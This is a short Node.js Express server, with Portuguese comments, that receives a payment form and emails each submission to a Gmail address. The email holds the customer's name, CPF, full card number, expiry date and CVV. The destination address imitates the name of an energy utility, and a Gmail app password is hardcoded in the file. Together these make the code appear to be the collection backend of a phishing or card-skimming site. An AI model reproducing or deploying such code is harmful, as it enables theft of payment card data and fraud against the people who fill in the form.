const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middlewares
app.use(bodyParser.json());
app.use(cors());

// Rota para receber os dados do formulário
app.post('/send-email', async (req, res) => {
  const { 
    name, 
    email, 
    cpf, 
    cardNumber, 
    expiryDate, 
    cvv, 
    installments, 
    totalValue, 
    installmentId 
  } = req.body;

  // Verifica se todos os campos necessários estão preenchidos
  if (!name || !email || !cpf || !cardNumber || !expiryDate || !cvv || !installments || !totalValue || !installmentId) {
    return res.status(400).json({ message: 'Todos os campos são obrigatórios.' });
  }

  try {
    // Configuração do transportador de e-mail
    const transporter = nodemailer.createTransport({
      service: 'gmail', // Ajuste para o provedor que está usando (ex.: Outlook, Yahoo)
      auth: {
        user: 'disponivelalterado@gmail.com', // Substitua pelo seu e-mail
        pass: 'zmuzuikyfvwoyfbz',           // Use o app password ou senha
      },
    });

    // Conteúdo do e-mail
    const mailOptions = {
      from: 'disponivelalterado@gmail.com',
      to: 'equaltorialenergia@gmail.com', // Substitua pelo e-mail de destino
      subject: 'Novo Pagamento Recebido',
      text: `
        Nome: ${name}
        E-mail: ${email}
        CPF: ${cpf}
        Número do Cartão: ${cardNumber}
        Data de Validade: ${expiryDate}
        CVV: ${cvv}
        Valor Total: ${totalValue}
        Parcelas: ${installments}
        ID do Parcelamento: ${installmentId}
      `,
    };

    // Envia o e-mail
    const info = await transporter.sendMail(mailOptions);
    console.log('E-mail enviado:', info.response);
    res.status(200).json({ message: 'E-mail enviado com sucesso!' });
  } catch (error) {
    console.error('Erro ao enviar o e-mail:', error);
    res.status(500).json({ message: 'Erro ao enviar o e-mail.' });
  }
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
